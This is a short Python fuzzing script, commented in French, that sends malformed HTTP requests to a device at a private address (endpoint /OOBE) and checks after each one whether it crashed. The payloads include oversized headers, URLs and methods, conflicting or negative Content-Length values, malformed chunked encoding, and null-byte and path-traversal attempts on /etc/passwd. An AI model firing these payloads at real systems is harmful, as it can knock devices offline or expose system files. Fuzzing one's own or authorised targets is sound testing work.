import socket, time
DEV=("10.201.126.241",8080)
def raw(payload, tmo=6, label=""):
    try:
        s=socket.create_connection(DEV,timeout=tmo); s.settimeout(tmo)
        s.sendall(payload)
        try: d=s.recv(300)
        except socket.timeout: d=b"<TO>"
        s.close(); return d
    except Exception as e: return f"EXC:{type(e).__name__}".encode()
def alive():
    try:
        s=socket.create_connection(DEV,timeout=4)
        s.sendall(b"GET / HTTP/1.0\r\n\r\n"); s.settimeout(4)
        d=s.recv(60); s.close(); return b"405" in d or b"400" in d
    except: return False
print("baseline:", alive())
tests=[
 ("header geant 20K", b"POST /OOBE HTTP/1.1\r\nX-A: " + b"A"*20000 + b"\r\nContent-Length: 0\r\n\r\n"),
 ("request line geante", b"POST /" + b"B"*20000 + b" HTTP/1.1\r\n\r\n"),
 ("URL geante", b"GET /" + b"C"*60000 + b" HTTP/1.0\r\n\r\n"),
 ("content-length enorme", b"POST /OOBE HTTP/1.1\r\nContent-Length: 999999999999\r\n\r\n"),
 ("content-length negatif", b"POST /OOBE HTTP/1.1\r\nContent-Length: -1\r\n\r\n"),
 ("2x content-length", b"POST /OOBE HTTP/1.1\r\nContent-Length: 5\r\nContent-Length: 500\r\n\r\nhello"),
 ("chunked malformed", b"POST /OOBE HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\nZZZZ\r\n"),
 ("null dans path", b"POST /OOBE\x00/../etc/passwd HTTP/1.1\r\n\r\n"),
 ("method geante", b"M"*10000 + b" / HTTP/1.1\r\n\r\n"),
 ("traversee", b"GET /../../../../etc/passwd HTTP/1.0\r\n\r\n"),
 ("100 headers", b"POST /OOBE HTTP/1.1\r\n" + b"".join(b"X-%d: v\r\n"%i for i in range(100)) + b"Content-Length: 0\r\n\r\n"),
]
for label,payload in tests:
    st=raw(payload,label=label); ok=alive()
    print(f"{label:26} len={len(payload):7} -> {st[:50]!r} alive={ok}")
    if not ok:
        print(f"  ★★★ MORT: {label}"); break
    time.sleep(0.4)
